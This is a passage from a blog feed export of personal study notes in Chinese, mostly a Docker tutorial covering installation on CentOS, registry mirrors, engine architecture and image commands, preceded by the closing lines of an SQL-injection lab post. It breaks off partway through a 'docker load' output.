alt="image-20240202173059912"></p><p>null时不行，空着是都可以</p><p>这里拿Less-7来练习</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker</title>
      <link href="/2024/03/02/docker/"/>
      <url>/2024/03/02/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>Hypervisor允许多个操作系统共享一个CPU(多核CPU的情况可以是多个CPU)。处于操作系统与硬件系统之间，用于实现多个虚拟机共享宿主机的硬件系统。</p><p>hyper-v则是微软提供的商业化Hypervisor，运行在windows系统上</p><p>KVM与Xen是linux系统上开源的Hypervisor</p><p>现在的Windows系统的架构（操作系统和应用层分别是两个虚拟机，位于Hyper-V之上）</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229202902295.png" alt="image-20240229202902295"></p><p>容器与虚拟机的最大区别是</p><p>虚拟机中存在独立的硬件系统与操作系统，但容器中的全部是共享的宿主机中的操作系统与硬件系统。</p><p>VMware Workstation 要等到15.5.5版本开始，才对VMM虚拟机技术进行了重构，之前需要直接调用CPU的虚拟化功能，现在调用Win10系统的WHP（Windows 的Hypervisor平台）的API，解决了VMware Workstation与Hyper-V的不兼容问题。</p><h2 id="Docker的架构图"><a href="#Docker的架构图" class="headerlink" title="Docker的架构图"></a>Docker的架构图</h2><p><img src="https://docs.docker.com/get-started/images/docker-architecture.webp" alt="Docker Architecture diagram"></p><p>Docker使用客户机-服务器架构。Docker客户端与Docker守护进程通信，后者完成构建、运行和分发Docker容器的繁重工作。Docker客户端和守护进程可以运行在同一个系统上，或者您可以将Docker客户端连接到远程Docker守护进程。Docker客户端和守护进程使用REST API，通过UNIX套接字或网络接口进行通信。另一个Docker客户端是Docker Compose，它允许你处理由一组容器组成的应用程序。</p><h2 id="Centos安装Doker"><a href="#Centos安装Doker" class="headerlink" title="Centos安装Doker"></a>Centos安装Doker</h2><p><a href="https://blog.csdn.net/weixin_41394654/article/details/123442460">CentOS7安装jdk</a></p><p>查看防火墙状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure><p>开启的话要关闭，然后可以做一个有基本命令和功能的基础虚拟机，然后用VM克隆。</p><p>centos的网卡文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/sysconfig/network-script/ifcfg-ens33</span><br></pre></td></tr></table></figure><p>配置完可以加到hosts文件，之后用MobaXterm连接可以直接用名字，解析更方便，不加也没关系</p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229221236567.png" alt="image-20240229221236567" style="zoom:67%;" /><p>下面安装仓库repository</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo yum install -y yum-utils</span><br><span class="line">$ sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>用阿里云的镜像地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo     http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"> </span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>看下yun的仓库文件下有没有Docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ll /etc/yum.repos.d</span><br></pre></td></tr></table></figure><p>安装Docker Engine</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum - y install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure><p>加个-y用来同意，省的输入,下面这个可以用来看版本，挑想要的装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure><p>安装的时候把version string换成想要的即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce- &lt;VERSION STRING&gt; docker-ce-cli- &lt;VERSION_ STRING》 containerd.io docker-compose-plugin</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>安装后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>这一步记得在root权限执行，不然容易出问题</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229232953166.png" alt="image-20240229232953166"></p><p>然后,看一下自己有什么镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>然后可以试一下hello world</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229233235488.png" alt="image-20240229233235488"></p><p>因为没有这个镜像，一般会去下载默认的最新的这个镜像，没加tags默认就是leatest，然后latest：后面的那个就是拉取来源，hello到之后的内容就是镜像的结果，然后可以再看一下你的库里有什么</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240229233440257.png" alt="image-20240229233440257"></p><p>可以发现多了个hello-world的镜像，然后上面有相应的信息</p><p>再来查看一下状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301143347091.png" alt="image-20240301143347091"></p><p>这个disable说明这个不是自启动的，我们可以通过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><p>来让他自启动</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301143544195.png" alt="image-20240301143544195"></p><p>练习的时候就不用自启动了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl disable docekr</span><br></pre></td></tr></table></figure><p>docker的关闭,关闭虚拟机时可以先关闭docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure><h2 id="配置国内加速器官方教程"><a href="#配置国内加速器官方教程" class="headerlink" title="配置国内加速器官方教程"></a>配置国内加速器<a href="https://developer.aliyun.com/article/886423?accounttraceid=73363bc7579a4e34963fee55e20ac1b2rtpf">官方教程</a></h2><p>先登陆阿里云加速器的网站，然后进入镜像加速器的页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://cr.console.aliyun.com/cn-hangzhou/mirrors</span><br></pre></td></tr></table></figure><p>在etc文件下创建一个docker目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br></pre></td></tr></table></figure><p>然后用tee命令把东西输入到daemon.json文件，这个文件是新建的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tee /etc/docker/dameon.json &lt;&lt;-&#x27;EOF&#x27;</span><br></pre></td></tr></table></figure><p>tee命令可以创建一个文件，然后你输入一个东西他会写进去并回显你输入的东西</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tee hello.log</span><br><span class="line">hello</span><br><span class="line">hello</span><br><span class="line">hello 1</span><br><span class="line">hello 1</span><br><span class="line">hello 2</span><br><span class="line">hello 2</span><br><span class="line">^C</span><br><span class="line">[root@localhost ~]# cat hello.log</span><br><span class="line">hello</span><br><span class="line">hello 1</span><br><span class="line">hello 2</span><br></pre></td></tr></table></figure><p>具体内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tee /etc/docker/dameon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt; &quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; EOF</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost ~]# cat /etc/docker/dameon.json</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://9e15pjnb.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">[                  root@localhost ~]#</span><br></pre></td></tr></table></figure><p>然后重新加载一下配置和重启一下docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>拉一个centos：7的镜像试试,感觉还是挺慢的</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull centos:7</span><br><span class="line">7: Pulling from library/centos</span><br><span class="line">2d473b07cdd5: Pull complete</span><br><span class="line">Digest: sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4</span><br><span class="line">Status: Downloaded newer image for centos:7</span><br><span class="line">docker.io/library/centos:7</span><br></pre></td></tr></table></figure><h2 id="Docker引擎的卸载"><a href="#Docker引擎的卸载" class="headerlink" title="Docker引擎的卸载"></a>Docker引擎的卸载</h2><ol><li><p>Uninstall the Docker Engine, CLI, containerd, and Docker Compose packages:</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo yum remove docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-ce-rootless-extras</span></span><br></pre></td></tr></table></figure></li><li><p>Images, containers, volumes, or custom configuration files on your host aren’t automatically removed. To delete all images, containers, and volumes:</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">rm</span> -rf /var/lib/docker</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">rm</span> -rf /var/lib/containerd</span></span><br></pre></td></tr></table></figure></li></ol><p>3.还有一些自己创建的配置文件</p><h2 id="Docker发展"><a href="#Docker发展" class="headerlink" title="Docker发展"></a>Docker发展</h2><p>首发架构由两大核心组件构成: LXC(Linux Container) 与Docker Daemon。<br>首发架构的两大问题:</p><p>严重依赖于LXC，出现了“卡脖子”问题，及无法实现Docker跨平台。所以在0.9版本使用了Docker自研的Libcontainer替换了LxC。</p><p>Docker Daemon中的“大而全”使得版本更新难、性能出现瓶颈、不符合软件哲学(由Unix团队提出)，关键是，其还存在着“中心化”问题。所以在1.1版本中其实现了OCI规范，将容器运行时Runc从Docker Daemon中剥离出来。</p><h3 id="Docker引擎架构"><a href="#Docker引擎架构" class="headerlink" title="Docker引擎架构"></a>Docker引擎架构</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301161001288.png" alt="image-20240301161001288"></p><ul><li>Docker Client：用户提交Docker命令。</li><li>Docked：负责REST API、处理镜像相关命令、网络、容器编排等。</li><li>Containerd：负责容器生命周期的管理，负责处理容器相关的命令，但不负责创建容器，当docker un命令的到来时会fork出Runc和Shim两个进程</li><li>Runc：负责创建容器进程，容器创建并启动后，将容器进程交给Shim处理，然后自己推出。</li><li>Shim：负责将容器与Docker Daemon进行解耦</li></ul><h3 id="Docker引擎分类"><a href="#Docker引擎分类" class="headerlink" title="Docker引擎分类"></a>Docker引擎分类</h3><p> Docker三大版本（Moby、CE、EE），两个小版本(edge月、stable季)</p><h2 id="镜像基础"><a href="#镜像基础" class="headerlink" title="镜像基础"></a>镜像基础</h2><h3 id="镜像简介"><a href="#镜像简介" class="headerlink" title="镜像简介"></a>镜像简介</h3><p>镜像是一种轻量级、可执行的独立软件包，也可以说是一个精简的操作系统。镜像中包含应用软件及应用软件的运行环境。具体来说镜像包含运行某个软件所需的所有内容，包括代码、库、环境变量和配置文件等。几乎所有应用，直接打包为 Docker 镜像后就可以运行。由于镜像的运行时是容器，容器的设计初衷就是快速和小巧，所以镜像通常都比较小，镜像中不包含内核，其共享宿主机的内核:镜像中只包含简单的 Shell，或没有 Shell。</p><p>busybox一个大的工具箱，集成了很多有用的linux命令工具等，堪称linux的瑞士军刀，下载一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull busybox</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/busybox</span><br><span class="line">9ad63333ebc9: Pull complete</span><br><span class="line">Digest: sha256:6d9ac9237a84afe1516540f40a0fafdc86859b2141954b4d643af7066d598b74</span><br><span class="line">Status: Downloaded newer image for busybox:latest</span><br><span class="line">docker.io/library/busybox:latest</span><br></pre></td></tr></table></figure><p>很小，就是一个微型的系统</p><h3 id="仓库分类"><a href="#仓库分类" class="headerlink" title="仓库分类"></a>仓库分类</h3><ul><li><p>Docker Official Image</p><p>Docker 官方镜像仓库。该类仓库中的镜像由 Docker 官方构建发布，代码质量较高且安全，有较完善的文档。该类仓库中的镜像会及时更新。一般常用的系统、工具软件、中间件都有相应的官方镜像仓库。例如，Zookeeper、Redis、Nginx 等。官方镜像仓库的名称<repository>一般直接为该类软件的名称<software-name>。“</p></li><li><p>Verified Publisher</p><p>已验证发布者仓库。该类仓库中的镜像由非 Docker 官方的第三方发布。但该第三方是由 Docker 公司审核认证过的，一般为大型企业、团体或组织。审核通过后，Docker 公司会向其颁发“VERIFIED PUBLISHER”标识。这种仓库中镜像的质量还有有保证的。除了官方镜像仓库，其它都是非官方镜像仓库。非官方镜像仓库名称<repository>一般由发布者用户名与软件名称两部分构成，形式为: <username>&#x2F;<software-name></p></li><li><p>Sponsored OSS</p><p>由 Docker 公司赞助开发的镜像仓库。该类仓库中的镜像也由非 Docker 官方的第三方发布，但该镜像的开发是由 Docker 公司赞助的。该类型的第三方一般为个人、团队或组织。这种仓库中镜像的质量也是有保证的。“</p></li><li><p>无认证</p></li></ul><p>​不安全</p><ul><li><p>第三方镜像中心</p><p>镜像中心默认使用的都是 Docker 官方的 Docker Hub。不过，镜像中心是可配置的，可以使用指定的第三方镜像中心。对于第三方镜像中心中的仓库名称<repository>由三部分构成:<domain-name>&#x2F;<username>&#x2F;<software-name>。其中的<domain-name>指的是第三方镜像中心的域名或IP。</p></li></ul><h3 id="镜像定位"><a href="#镜像定位" class="headerlink" title="镜像定位"></a>镜像定位</h3><p>对于任何镜像，都可通过<repository>:<tag>进行唯一定位。其中<tag>一般称为镜像的版本号。<tag>中有一个比较特殊的版本一-latest。如果不指定，默认<tag>即为 latest。不过，虽然其字面意思是最新版，一般其也的确存放的是最新版,但并不能保证其真的就是最新版。</p><h2 id="获取帮助信息"><a href="#获取帮助信息" class="headerlink" title="获取帮助信息"></a>获取帮助信息</h2><ol><li>官网获取<a href="https://docs.docker.com/reference/cli/docker/">https://docs.docker.com/reference/cli/docker/</a></li><li>docker –help</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version --help</span><br></pre></td></tr></table></figure><h2 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker pull [OPTIONS] NAME[:TAG|@DIGEST]</span><br><span class="line">--DIGEST摘要，镜像内容的哈希值，用来验证内容是否被篡改，和TAG同作用，但TAG更方便</span><br><span class="line">​</span><br><span class="line">Download an image from a registry --拉取一个仓库</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image pull, docker pull</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -a, --all-tags                Download all tagged images in the repository --下载一个仓库的所有镜像，可能会下载很多东西</span><br><span class="line">      --disable-content-trust   Skip image verification (default true) --跳过镜像的验证，默认是跳过的，下第三方的时候最好设置成false</span><br><span class="line">      --platform string         Set platform if server is multi-platform --拉去指定架构的镜像，不常用，一般都是和自身架构匹配的</span><br><span class="line">                                capable</span><br><span class="line">  -q, --quiet                   Suppress verbose output</span><br><span class="line"> --省略下载的输出信息，减少信息冗余</span><br></pre></td></tr></table></figure><h2 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker images [OPTIONS] [REPOSITORY[:TAG]]</span><br><span class="line">​</span><br><span class="line">List images</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image ls, docker image list, docker images</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Show all images (default hides intermediate images)</span><br><span class="line">      --digests         Show digests</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided</span><br><span class="line">      --format string   Format output using a custom template:</span><br><span class="line">                        &#x27;table&#x27;:            Print output in table format</span><br><span class="line">                        with column headers (default)</span><br><span class="line">                        &#x27;table TEMPLATE&#x27;:   Print output in table format</span><br><span class="line">                        using the given Go template</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given</span><br><span class="line">                        Go template.</span><br><span class="line">                        Refer to https://docs.docker.com/go/formatting/</span><br><span class="line">                        for more information about formatting output with</span><br><span class="line">                        templates</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output</span><br><span class="line">  -q, --quiet           Only show image IDs</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>– digests可以查看镜像的摘要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --digests</span><br><span class="line">REPOSITORY    TAG       DIGEST                                                                    IMAGE ID       CREATED         SIZE</span><br><span class="line">busybox       latest    sha256:6d9ac9237a84afe1516540f40a0fafdc86859b2141954b4d643af7066d598b74   3f57d9401f8d   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    sha256:d000bc569937abbe195e20322a0bde6b2922d805332fd6d8a68b19f524b7d21d   d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line">centos        7         sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4   eeb6ee3f44bd   2 years ago     204MB</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>–no-trunc,写全信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --no-trunc</span><br><span class="line">REPOSITORY    TAG       IMAGE ID                                                                  CREATED         SIZE</span><br><span class="line">busybox       latest    sha256:3f57d9401f8d42f986df300f0c69192fc41da28ccc8d797829467780db3dd741   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a   10 months ago   13.3kB</span><br><span class="line">centos        7         sha256:eeb6ee3f44bd0b5103bb561b4c16bcb82328cfe5809ab675bb17ab3a16c517c9   2 years ago     204MB</span><br></pre></td></tr></table></figure><p>-q是显示简略信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images -q</span><br><span class="line">3f57d9401f8d</span><br><span class="line">d2c94e258dcb</span><br><span class="line">eeb6ee3f44bd</span><br></pre></td></tr></table></figure><p>docker rmi  $(docker images -q)删除所有镜像</p><p>但遇到一个问题”Error response from daemon: invalid reference format: repository name must be lowercase”但这个好像是要小写命名docker镜像</p><p>这个好像要重命名才能解决</p><p>docker images 镜像名字，单独查看那个镜像的信息</p><p>-f 过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images -f dangling=true --悬虚镜像：悬虚镜像就是镜像没有仓库名或没有标签查询显示虚悬镜像，在列表中展示为 &lt;none&gt;:&lt;none&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200412145250562.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-D5avIWwl-1586674340510)(evernotecid://621D2FF6-4E72-4E02-9043-55F31F42819B/appyinxiangcom/22553815/ENResource/p1118)]"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images -f since=hello-world</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">busybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</span><br></pre></td></tr></table></figure><p>since这个是看自since之后的东西，也可以用before看之前的</p><p>reference&#x3D; * : * 宽泛查询，*</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images -f reference=*:latest找所有latest版本的镜像</span><br><span class="line">docker images -f refernece=centos:*找所有版本的centos</span><br><span class="line">docker images -f reference=*t*找到名字和版本中包含字母t的镜像</span><br><span class="line">但reference只查官方的</span><br></pre></td></tr></table></figure><p>–format 格式化输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images --format &#123;&#123;.Repository&#125;&#125;</span><br><span class="line">busybox</span><br><span class="line">hello-world</span><br><span class="line">centos</span><br><span class="line">[root@localhost ~]# docker images --format &#123;&#123;.Repository&#125;&#125;:&#123;&#123;.Tag&#125;&#125;</span><br><span class="line">busybox:latest</span><br><span class="line">hello-world:latest</span><br><span class="line">centos:7</span><br></pre></td></tr></table></figure><h2 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker search centos</span><br><span class="line">NAME                               DESCRIPTION                                                                                                                   STARS     OFFICIAL</span><br><span class="line">centos                             DEPRECATED; The official build of CentOS.                                                                                     7715      [OK]</span><br><span class="line">kasmweb/centos-7-desktop           CentOS 7 desktop for Kasm Workspaces                                                                                          43</span><br><span class="line">...</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>AUTOMATED表示当前镜像是否是”自动化镜像“，就是使用Docker Hub连接一个包含Dockerfile文件（专门构建镜像用的文件）的GitHub仓库或Bitbucket仓库（源码托管平台），然后Docker Hub就会自动根据Dockerfile内容构建镜像，这种构建出的镜像就会带AUTOMATED，这种构建镜像的方式称为Trusted Build（受信构建）。只要Dockerfile文件内容发生变化，那么Docker Hub就会构建出新的镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker search --help</span><br><span class="line"></span><br><span class="line">Usage:  docker search [OPTIONS] TERM</span><br><span class="line"></span><br><span class="line">Search Docker Hub for images</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided -f和之前的images差不多</span><br><span class="line">      --format string   Pretty-print search using a Go template</span><br><span class="line">      --limit int       Max number of search results-限制个数</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output</span><br></pre></td></tr></table></figure><h2 id="dockers-rmi"><a href="#dockers-rmi" class="headerlink" title="dockers rmi"></a>dockers rmi</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker rmi --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker rmi [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line">​</span><br><span class="line">Remove one or more images</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image rm, docker image remove, docker rmi</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -f, --force      Force removal of the image --强制删除</span><br><span class="line">      --no-prune   Do not delete untagged parents --和镜像层相关</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>操作一下试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">busybox       latest    3f57d9401f8d   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line">centos        7         eeb6ee3f44bd   2 years ago     204MB</span><br><span class="line">[root@localhost ~]# docker rmi centos:7</span><br><span class="line">Untagged: centos:7</span><br><span class="line">Untagged: centos@sha256:be65f488b7764ad3638f236b7b515b3678369a5124c47b8d32916d6487418ea4</span><br><span class="line">Deleted: sha256:eeb6ee3f44bd0b5103bb561b4c16bcb82328cfe5809ab675bb17ab3a16c517c9</span><br><span class="line">Deleted: sha256:174f5685490326fc0a1c0f5570b8663732189b327007e47ff13d2ca59673db02</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">busybox       latest    3f57d9401f8d   6 weeks ago     4.26MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line">[root@localhost ~]# docker rmi hello-world</span><br><span class="line">Error response from daemon: conflict: unable to remove repository reference &quot;hello-world&quot; (must force) - container 9c54e5ac2981 is using its referenced image d2c94e258dcb</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND    CREATED        STATUS                    PORTS     NAMES</span><br><span class="line">9c54e5ac2981   hello-world   &quot;/hello&quot;   6 hours ago    Exited (0) 6 hours ago              ecstatic_ride</span><br><span class="line">0881099d27ad   hello-world   &quot;/hello&quot;   20 hours ago   Exited (0) 20 hours ago             vibrant_murdock</span><br><span class="line">[root@localhost ~]# docker rmi -f hello-world</span><br><span class="line">Untagged: hello-world:latest</span><br><span class="line">Untagged: hello-world@sha256:d000bc569937abbe195e20322a0bde6b2922d805332fd6d8a68b19f524b7d21d</span><br><span class="line">Deleted: sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND    CREATED        STATUS                    PORTS     NAMES</span><br><span class="line">9c54e5ac2981   d2c94e258dcb   &quot;/hello&quot;   7 hours ago    Exited (0) 7 hours ago              ecstatic_ride</span><br><span class="line">0881099d27ad   d2c94e258dcb   &quot;/hello&quot;   20 hours ago   Exited (0) 20 hours ago             vibrant_murdock</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">busybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</span><br></pre></td></tr></table></figure><p>其中hello-world因为已经运行在容器里了，可以ps -a一下看看，然后用-f强制删除</p><h2 id="docker-save"><a href="#docker-save" class="headerlink" title="docker save"></a>docker save</h2><p>用来把镜像打包保存到本体，方变移动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED       SIZE</span><br><span class="line">zookeeper    3.7       446078172ae8   2 weeks ago   307MB</span><br><span class="line">busybox      latest    3f57d9401f8d   6 weeks ago   4.26MB</span><br><span class="line">[root@localhost ~]# docker save --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker save [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line">​</span><br><span class="line">Save one or more images to a tar archive (streamed to STDOUT by default)</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image save, docker save</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -o, --output string   Write to a file, instead of STDOUT</span><br><span class="line">[root@localhost ~]# docker save -o my.tar zookeeper:3.7 busybox:latest</span><br><span class="line">[root@localhost ~]# ll</span><br><span class="line">total 310364</span><br><span class="line">...</span><br><span class="line">-rw-------. 1 root root 317776384 Mar  1 04:01 my.tar</span><br><span class="line">...</span><br><span class="line">也可以重定向到一个文件里，用&gt;</span><br><span class="line">​</span><br><span class="line">[root@localhost ~]# docker save zookeeper:3.7 busybox:latest &gt; new.tar</span><br><span class="line">[root@localhost ~]# ll</span><br><span class="line">total 620696</span><br><span class="line">...</span><br><span class="line">-rw-------. 1 root root 317776384 Mar  1 04:01 my.tar</span><br><span class="line">-rw-r--r--. 1 root root 317776384 Mar  1 04:03 new.tar</span><br><span class="line">...大小都是一样得</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301200411484.png" alt="image-20240301200411484"></p><p>这是原来的，然后把它们删除</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker rmi 446078172ae8 3f57d9401f8d</span><br><span class="line">...</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID   CREATED   SIZE</span><br></pre></td></tr></table></figure><p>然后再把tar加载出来</p><h3 id="docker-load"><a href="#docker-load" class="headerlink" title="docker load"></a>docker load</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker load --help</span><br><span class="line">​</span><br><span class="line">Usage:  docker load [OPTIONS]</span><br><span class="line">​</span><br><span class="line">Load an image from a tar archive or STDIN</span><br><span class="line">​</span><br><span class="line">Aliases:</span><br><span class="line">  docker image load, docker load</span><br><span class="line">​</span><br><span class="line">Options:</span><br><span class="line">  -i, --input string   Read from tar archive file, instead of STDIN</span><br><span class="line">  -q, --quiet          Suppress the load output</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker load -i my.tar</span><br><span class="line">2e112031b4b9: Loading layer  4.492MB/4.492MB</span><br><span class="line">Loaded image: busybox:latest</span><br><span class="line">d101c9453715: Loading layer  80.41MB/80.41MB</span><br><span class="line">431a6830edc6: Loading layer  38.53MB/38.53MB</span><br><span class="line">c5da6d3a7681: Loading layer  140.9MB/140.9MB</span><br><span class="line">48ea7a659f10: Loading layer   2.56kB/2.56kB</span><br><span class="line">da0e0faf395b: Loading layer  3.072kB/3.072kB</span><br><span class="line">fb2a43f5cc59: Loading layer  